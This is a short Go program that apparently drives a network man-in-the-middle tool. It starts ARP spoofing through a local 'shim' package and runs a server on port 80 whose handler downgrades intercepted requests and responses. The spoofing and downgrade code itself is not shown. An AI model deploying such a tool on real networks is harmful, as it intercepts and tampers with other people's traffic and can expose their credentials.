package main

import (
    "log"
    "./shim"
)

func main() {
    err := shim.StartArpSpoof()
    if err != nil {
        return
    }

    downgradeHandler := shim.NewDowngradeHandler()
    server := shim.Server{
        RequestHandlers: []shim.RequestHandler{
            downgradeHandler,
        },
        ResponseHandlers: []shim.ResponseHandler{
            downgradeHandler,
        },
    }
    err = server.Run(80)
    log.Println(err.Error())
}
